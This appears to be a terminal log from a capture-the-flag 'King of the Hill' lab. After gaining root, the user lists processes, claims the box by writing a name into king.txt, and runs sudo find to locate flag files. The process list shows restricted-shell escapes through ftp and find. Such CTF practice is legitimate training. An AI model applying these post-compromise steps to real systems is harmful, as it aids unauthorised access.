/usr/local/go/src/cmd/go/internal/load/flag_test.go
/usr/local/go/src/cmd/go/internal/test/testflag.go
/usr/local/go/src/cmd/go/internal/vet/vetflag.go
/usr/local/go/src/cmd/go/testdata/script/build_gcflags.txt
/usr/local/go/src/cmd/go/testdata/script/build_runtime_gcflags.txt
/usr/local/go/src/cmd/go/testdata/script/gcflags_patterns.txt
/usr/local/go/src/cmd/go/testdata/script/goflags.txt
/usr/local/go/src/cmd/go/testdata/script/modfile_flag.txt
/usr/local/go/src/cmd/go/testdata/script/test_flag.txt
/usr/local/go/src/cmd/go/testdata/script/vet_flags.txt
/usr/local/go/src/cmd/go/testdata/standalone_testmain_flag_test.go
/usr/local/go/src/cmd/internal/obj/textflag.go
/usr/local/go/src/cmd/internal/objabi/flag.go
/usr/local/go/src/cmd/vendor/github.com/google/pprof/internal/driver/flags.go
/usr/local/go/src/cmd/vendor/golang.org/x/tools/go/analysis/internal/analysisflags/flags.go
/usr/local/go/src/flag/flag.go
/usr/local/go/src/flag/flag_test.go
/usr/local/go/src/runtime/cpuflags.go
/usr/local/go/src/runtime/cpuflags_amd64.go
/usr/local/go/src/runtime/textflag.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/arch/x86/include/asm/irqflags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/arch/x86/include/asm/processor-flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/asm-generic/irqflags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/arch/hweight/cflags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/arch/uses/high/vma/flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/trace/irqflags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/zone/dma/flag.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/config/want/page/debug/flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/linux/kernel-page-flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/linux/irqflags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/linux/page-flags-layout.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/linux/page-flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/linux/pageblock-flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/trace/events/gfpflags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/uapi/linux/kernel-page-flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/include/uapi/linux/tty_flags.h
/usr/src/kernels/3.10.0-1062.18.1.el7.x86_64.debug/scripts/coccinelle/locks/flags.cocci
/home/po/flag.txt
/home/shifu/flag.txt
/home/tigress/flag.txt
sh-4.2# pflags
     1         systemd RANDOMIZE|SUPERPRIV|USED_MATH
     2        kthreadd FORKNOEXEC|KTHREAD|NOFREEZE|USED_MATH
     3     ksoftirqd/0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH
     5    kworker/0:0H FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
     6   kworker/u30:0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
     7     migration/0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH
     8          rcu_bh FORKNOEXEC|KTHREAD|NOFREEZE|USED_MATH
     9       rcu_sched FORKNOEXEC|KTHREAD|NOFREEZE|USED_MATH
    10   lru-add-drain FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    11      watchdog/0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|SUPERPRIV|USED_MATH
    13       kdevtmpfs FORKNOEXEC|KTHREAD|NOFREEZE|SUPERPRIV|USED_MATH
    14           netns FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    15        xenwatch FORKNOEXEC|KTHREAD|NOFREEZE|USED_MATH
    16          xenbus FORKNOEXEC|KTHREAD|NOFREEZE|USED_MATH
    18      khungtaskd FORKNOEXEC|KTHREAD|NOFREEZE|USED_MATH
    19       writeback FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    20     kintegrityd FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    21          bioset FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    22         kblockd FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    23              md FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    24     edac-poller FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    29         kswapd0 FORKNOEXEC|KSWAPD|KTHREAD|MEMALLOC|SWAPWRITE|USED_MATH
    30            ksmd FORKNOEXEC|FREEZER_SKIP|KTHREAD|USED_MATH
    31      khugepaged FORKNOEXEC|FREEZER_SKIP|KTHREAD|USED_MATH
    32          crypto FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    40        kthrotld FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    42    kmpath_rdacd FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    43          kaluad FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    44       kpsmoused FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    46   ipv6_addrconf FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    59         deferwq FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
    90         kauditd FORKNOEXEC|KTHREAD|USED_MATH
   269         ata_sff FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   273       scsi_eh_0 FORKNOEXEC|KTHREAD|NOFREEZE|USED_MATH
   274      scsi_tmf_0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   275       scsi_eh_1 FORKNOEXEC|KTHREAD|NOFREEZE|USED_MATH
   276      scsi_tmf_1 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   277   kworker/u30:3 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   341        kdmflush FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   342          bioset FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   352        kdmflush FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   353          bioset FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   365          bioset FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   366        xfsalloc FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   367   xfs_mru_cache FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   368    xfs-buf/dm-0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   369   xfs-data/dm-0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   370   xfs-conv/dm-0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   371    xfs-cil/dm-0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   372 xfs-reclaim/dm- FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   373    xfs-log/dm-0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   374 xfs-eofblocks/d FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   375    xfsaild/dm-0 FORKNOEXEC|FREEZER_SKIP|KTHREAD|MEMALLOC|USED_MATH
   376    kworker/0:1H FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   443 systemd-journal RANDOMIZE|SUPERPRIV|USED_MATH
   466         lvmetad FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   474   systemd-udevd RANDOMIZE|SUPERPRIV|USED_MATH
   534        ttm_swap FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   546   xfs-buf/xvda1 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   547  xfs-data/xvda1 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   548  xfs-conv/xvda1 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   549   xfs-cil/xvda1 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   550 xfs-reclaim/xvd FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   551   xfs-log/xvda1 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   552 xfs-eofblocks/x FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
   553   xfsaild/xvda1 FORKNOEXEC|FREEZER_SKIP|KTHREAD|MEMALLOC|USED_MATH
   569          auditd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
   593            koth RANDOMIZE|SUPERPRIV|USED_MATH
   597         polkitd FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   601     dbus-daemon RANDOMIZE|SUPERPRIV|USED_MATH
   614         chronyd FORKNOEXEC|FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   616  NetworkManager FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   617  systemd-logind RANDOMIZE|SUPERPRIV|USED_MATH
   619           crond FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   853        dhclient FORKNOEXEC|FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   910           tuned FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   913         php-fpm RANDOMIZE|SUPERPRIV|USED_MATH
   925            sshd FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   927        rsyslogd FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
   929            nmbd RANDOMIZE|SUPERPRIV|USED_MATH
   933          agetty RANDOMIZE|SUPERPRIV|USED_MATH
   934          agetty RANDOMIZE|SUPERPRIV|USED_MATH
  1061            java FREEZER_SKIP|RANDOMIZE|USED_MATH
  1068           named FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1123           httpd FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
  1136     mysqld_safe RANDOMIZE|SUPERPRIV|USED_MATH
  1299          mysqld FREEZER_SKIP|RANDOMIZE|USED_MATH
  1340          master FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1341          pickup RANDOMIZE|SUPERPRIV|USED_MATH
  1342            qmgr RANDOMIZE|SUPERPRIV|USED_MATH
  1356            smbd RANDOMIZE|SUPERPRIV|USED_MATH
  1357         php-fpm FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1358         php-fpm FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1359         php-fpm FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1360         php-fpm FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1361         php-fpm FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1388           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1389           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1391           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1401           nginx FORKNOEXEC|RANDOMIZE|USED_MATH
  1402           nginx FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1577    smbd-notifyd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1578        cleanupd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1647            lpqd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1698            sshd FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
  1704            sshd FORKNOEXEC|FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
  1708           rbash RANDOMIZE|USED_MATH
  1728            find RANDOMIZE|SUPERPRIV|USED_MATH
  1729              sh RANDOMIZE|SUPERPRIV|USED_MATH
  1732            find RANDOMIZE|SUPERPRIV|USED_MATH
  1733              sh RANDOMIZE|SUPERPRIV|USED_MATH
  1740           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1747           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1751           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1759           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1762           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1764           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1766           httpd FORKNOEXEC|RANDOMIZE|SUPERPRIV|USED_MATH
  1848             yum FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
  1916            sshd FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
  1918            sshd FORKNOEXEC|FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
  1919           rbash RANDOMIZE|USED_MATH
  1964             ftp RANDOMIZE|USED_MATH
  1965              sh RANDOMIZE|USED_MATH
  2026            sudo FREEZER_SKIP|RANDOMIZE|SUPERPRIV|USED_MATH
  2027             ftp RANDOMIZE|SUPERPRIV|USED_MATH
  2033              sh RANDOMIZE|SUPERPRIV|USED_MATH
  2063              sh FORKNOEXEC|RANDOMIZE|USED_MATH
  2615              sh FORKNOEXEC|RANDOMIZE|USED_MATH
  7442     kworker/0:2 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
 11632         anacron FORKNOEXEC|RANDOMIZE|USED_MATH
 22051     kworker/0:0 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
 26908     kworker/0:1 FORKNOEXEC|KTHREAD|NOFREEZE|NO_SETAFFINITY|USED_MATH|WQ_WORKER
 30867           sleep FREEZER_SKIP|RANDOMIZE|USED_MATH
 30868           sleep FREEZER_SKIP|RANDOMIZE|USED_MATH
 30869          pflags RANDOMIZE|USED_MATH
sh-4.2# ls
king.txt  koth
sh-4.2# cat king.txt
cyber30
sh-4.2# echo cyber30 > king.txt
sh-4.2# cat king.txt
cyber30
sh-4.2# sudo find / -type f -name "*flag*" 2>/dev/null >info
sh-4.2# less info
sh-4.2# exit
exit
ftp> exit
sh-4.2$ exit
exit
ftp> exit
[shifu@panda ~]$ exit
logout
Connection to 10.10.132.160 closed.
